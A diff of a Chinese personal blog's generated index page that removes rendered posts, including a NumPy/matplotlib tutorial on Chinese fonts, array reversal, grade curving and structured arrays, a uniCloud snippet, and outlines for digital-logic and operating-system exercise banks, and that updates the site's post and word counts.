-<h3 id="eg2-汉化">Eg2 汉化</h3>
-<p>使用了免费的<a
-target="_blank" rel="noopener" href="https://source.typekit.com/source-han-serif/cn/">思源黑体</a>
-<pre class="line-numbers language-none"><code class="language-none"># fname 为下载的字体库路径
-zhfont1 &#x3D; matplotlib.font_manager.FontProperties(fname&#x3D;&quot;SourceHanSerifSC-Bold.otf&quot;) 
- 
-x &#x3D; np.arange(1,11) 
-y &#x3D;  2  * x +  5 
-plt.title(&quot;测试&quot;, fontproperties&#x3D;zhfont1) 
- 
-# fontproperties 设置中文显示，fontsize 设置字体大小
-plt.xlabel(&quot;x 轴&quot;, fontproperties&#x3D;zhfont1)
-plt.ylabel(&quot;y 轴&quot;, fontproperties&#x3D;zhfont1)
-plt.plot(x,y) 
-plt.show()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<h2 id="反序">反序</h2>
-<h3 id="eg1">Eg1</h3>
-<pre class="line-numbers language-none"><code class="language-none">arr &#x3D; np.arange(9).reshape(3,3)
-
-print(arr[::-1, :]) # 行逆序
-print(arr[:, ::-1]) # 列逆序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>:为选中行，::-1为逆序</p>
-<h1 id="project">Project</h1>
-<h2 id="project1-修改分数">Project1 修改分数</h2>
-<p>假设你是一名大学教师，你在最近的期末考中失手出了巨难的考题，因此学生的成绩都不太理想。虽然如此，你很善良，不忍心大量学生因此挂科，所以你决定修改学科成绩曲线，让大家的分数看起来合理一些。</p>
-<p>你初次批改的卷面分分别为：[42, 35, 64, 85, 51, 72, 59, 12]
-这么一看，8 个人就有 5 个挂，着实有点狠了。</p>
-<pre class="line-numbers language-none"><code class="language-none">import numpy as np
-
-CURVE_CENTER &#x3D; 57.5  # python中用大写字母定义常量
-grades &#x3D; np.array([42, 35, 64, 85, 51, 72, 59, 12])
-
-
-def curve(grades):
-    average &#x3D; grades.mean()  # 计算分数的平均数
-    change &#x3D; CURVE_CENTER - average  # 中位数 - 平均数 &#x3D; 应加的分数
-    new_grades &#x3D; grades + change  # 新分数 &#x3D; 原分数 + 应加分数
-
-    return np.clip(new_grades, grades, 100)  # 使用 clip 函数限制分数上限
-
-
-print(curve(grades).astype(int))  # 打印新的分数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>如果不使用 NumPy
-处理成绩曲线，我们需要重复为各个分数进行加分后，再进行合计。NumPy
-把这些数据组合成数组后，便可以对这些数据进行统一处理，不仅去相对掉繁琐的
-for 循环，让代码看起来更简洁明了，更减少了代码出现 bug
-的概率。一般上，这个过程被称之为矢量化（vectorization）。</p>
-<h2 id="project2-检索学生班级与成绩">Project2 检索学生班级与成绩</h2>
-<p>因为批改大学的试卷太难了，你选择退而求其次，考了教师资格证成为高中体育老师。这一次，要用
-NumPy 分别记录学生的姓名、班级和成绩。</p>
-<p>在这次的场景中，将应用 NumPy
-中的记录数组（又称之为结构化数组）。这类数组可以为每一列指定数据类别（例如：str
-字符串、int 整数、bool
-布尔运算等）和名称，让数据筛选变得更简单强大。</p>
-<pre class="line-numbers language-none"><code class="language-none">import numpy as np
-
-data &#x3D; np.array([
-    (&quot;丁一&quot;, 1, 87),
-    (&quot;刘二&quot;, 2, 68),
-    (&quot;张三&quot;, 3, 72),
-    (&quot;李四&quot;, 3, 55),
-    (&quot;王五&quot;, 3, 93),
-    (&quot;赵六&quot;, 2, 81),
-    (&quot;孙七&quot;, 1, 75),
-    (&quot;周八&quot;, 1, 88),
-    (&quot;吴九&quot;, 2, 64),
-    (&quot;郑十&quot;, 2, 49)
-], dtype&#x3D;[(&quot;姓名&quot;, str, 10), (&quot;班级&quot;, int), (&quot;分数&quot;, int)])
-
-# 低于及格分数的学生姓名
-fail &#x3D; data[data[&quot;分数&quot;] &lt; 60][&quot;姓名&quot;]
-print(fail)
-
-# 分数最高的学生姓名、班级及分数
-top &#x3D; data[data[&quot;分数&quot;] &#x3D;&#x3D; np.max(data[&quot;分数&quot;])]
-print(top)
-
-# 各班级的学生姓名、班级及分数，需按分数大小逆序排列
-classes &#x3D; [1, 2, 3]
-
-for x in classes:
-    student &#x3D; np.sort(data[data[&quot;班级&quot;] &#x3D;&#x3D; x], order&#x3D;&quot;分数&quot;)[::-1]
-    print(student)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>对于data["分数"] ==
-np.max(data["分数"])这整个语句是新的布尔数组，[False, False, False,
-False, True, False, False, False, False, False]
-，传入data内部后会自动选择符合条件的。<br />
-data[布尔数组]
-使用这个布尔数组作为索引，选择满足条件（分数等于最大分数）的行。这个操作返回一个新的结构化数组，其中只包含满足条件的学生的信息。
-和前面的其实是一个道理，data["分数"] &lt; 60
-生成了一个布尔数组，其中的每个元素表示对应学生的分数是否小于60。然后，data[data["分数"]
-&lt; 60]
-使用这个布尔数组作为索引，选择了分数小于60的学生的所有字段。最后，["姓名"]
-部分选择了符合条件的学生中的姓名字段，得到了一个包含了分数小于60的学生姓名的数组。</p>
-<h1 id="参考文章">参考文章</h1>
-<p><a
-target="_blank" rel="noopener" href="https://lightly.teamcode.com/blog/python-numpy-practice-exercises/">【Python
-核心库】Numpy 教程与实战练习</a> <a
-target="_blank" rel="noopener" href="https://www.runoob.com/numpy/numpy-matplotlib.html">Runoob</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E7%A9%B6%E6%9E%81%E6%97%A0%E6%95%8C%E4%B9%8BUni-cloud/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.webp">
-      <meta itemprop="name" content="Arawn">
-      <meta itemprop="description" content="美好的一天从丢大包开始">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="今天你丢大包了吗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E7%A9%B6%E6%9E%81%E6%97%A0%E6%95%8C%E4%B9%8BUni-cloud/" class="post-title-link" itemprop="url">究极无敌之Uni-cloud</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-02-24 14:39:29" itemprop="dateCreated datePublished" datetime="2024-02-24T14:39:29+08:00">2024-02-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-25 13:47:22" itemprop="dateModified" datetime="2024-02-25T13:47:22+08:00">2024-02-25</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>366</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>unicloud在HbuilderX目录下分为cloudfunction（云对象）和database（云数据）</p>
-<h1 id="云对象">云对象</h1>
-<pre class="line-numbers language-none"><code class="language-none">async callco() &#123;
-    &#x2F;&#x2F; 导入名为 &quot;co1&quot; 的云函数对象
-    const co1 &#x3D; uniCloud.importObject(&quot;co1&quot;);
-
-    &#x2F;&#x2F; 调用云函数 co1 中的 say 方法，等待结果
-    let res &#x3D; await co1.say();
-    &#x2F;&#x2F;say中可以传递参数，实现服务端和客户端数据的交互
-    &#x2F;&#x2F; 将结果显示在一个模态框中
-    uni.showModal(&#123;
-        content: JSON.stringify(res),
-        showCancel: false
-    &#125;);
-&#125;,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E6%95%B0%E7%94%B5%E4%B9%A0%E9%A2%98%E5%BA%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.webp">
-      <meta itemprop="name" content="Arawn">
-      <meta itemprop="description" content="美好的一天从丢大包开始">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="今天你丢大包了吗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E6%95%B0%E7%94%B5%E4%B9%A0%E9%A2%98%E5%BA%93/" class="post-title-link" itemprop="url">数电习题库</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-02-22 16:10:57 / 修改时间：21:17:26" itemprop="dateCreated datePublished" datetime="2024-02-22T16:10:57+08:00">2024-02-22</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>35</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="逻辑函数的公式化简法">逻辑函数的公式化简法</h1>
-<h1 id="卡诺图化简法">卡诺图化简法</h1>
-<h1 id="组合逻辑电路分析">组合逻辑电路分析</h1>
-<h1 id="组合逻辑电路设计">组合逻辑电路设计</h1>
-<h1 id="译码器">译码器</h1>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://pluseven-sechs.github.io/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98%E5%BA%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.webp">
-      <meta itemprop="name" content="Arawn">
-      <meta itemprop="description" content="美好的一天从丢大包开始">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="今天你丢大包了吗">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98%E5%BA%93/" class="post-title-link" itemprop="url">操作系统习题库</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-02-22 14:05:12 / 修改时间：21:17:24" itemprop="dateCreated datePublished" datetime="2024-02-22T14:05:12+08:00">2024-02-22</time>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>50</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="地址变换和求fat表大小">地址变换和求fat表大小</h1>
-<h1 id="分区分配算法">分区分配算法</h1>
-<h1 id="页面置换算法">页面置换算法</h1>
-<h1 id="磁盘调度算法">磁盘调度算法</h1>
-<h1 id="处理机调度算法">处理机调度算法</h1>
-<h1 id="银行家算法">银行家算法</h1>
-<h1 id="进程的同步和互斥">进程的同步和互斥</h1>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1336,7 +1430,7 @@ target="_blank" rel="noopener" href="https://www.runoob.com/numpy/numpy-matplotl
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">49</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1387,12 +1481,12 @@ target="_blank" rel="noopener" href="https://www.runoob.com/numpy/numpy-matplotl
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">44k</span>
+    <span title="站点总字数">61k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:21</span>
+    <span title="站点阅读时长">1:51</span>
 </div>
 
 <!--
